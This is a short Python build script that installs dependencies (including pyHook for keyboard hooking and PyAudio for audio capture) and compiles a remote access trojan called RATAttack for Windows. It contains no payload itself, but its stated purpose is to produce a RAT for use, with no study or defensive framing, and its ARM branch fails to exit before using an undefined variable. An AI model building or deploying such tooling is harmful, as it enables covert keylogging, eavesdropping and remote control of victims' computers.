from platform import machine
from os import system as s
import sys

auto = len(sys.argv) == 2 and sys.argv[1] == '--yes'

if not auto:
    input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")

s('pip install -r requirements.txt')

if machine() == '':
    print('\nUnable to determine platform.\n')
    exit(1)
elif machine() == 'i386':
    fileA = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/PyAudio-0.2.11-cp37-cp37m-win32.whl'
    fileB = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/pyHook-1.5.1-cp37-cp37m-win32.whl'
elif machine() == 'amd64':
    fileA = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/PyAudio-0.2.11-cp37-cp37m-win_amd64.whl'
    fileB = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/pyHook-1.5.1-cp37-cp37m-win_amd64.whl'
else:
    print('\n\nYou are probably running a processor like ARM: "' + machine() + '". This isn\'t supported due to the lack of dependencies supporting ARM.')

s('pip install '+fileA)
s('pip install '+fileB)

if not auto:
    input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')

s('compile.bat')
print('\n\nScript has finished')
